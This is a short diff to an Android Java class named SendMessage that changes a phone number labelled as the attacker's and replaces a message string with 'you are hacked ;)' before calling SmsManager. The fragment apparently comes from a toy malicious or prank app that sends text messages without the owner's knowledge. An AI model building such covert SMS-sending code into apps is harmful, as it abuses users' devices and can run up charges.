@@ -13,10 +13,10 @@ public class SendMessage {
 
     public void sendMessage() {
         // Get the phone number of the attacker
-        String attackerPhoneNumber = "0650139138";
+        String attackerPhoneNumber = "0650139760";
 
         // Get the message to send
-        String message = "knbghik bzff";
+        String message = "you are hacked  ;)";
 
         // Send the message
         SmsManager smsManager = SmsManager.getDefault();
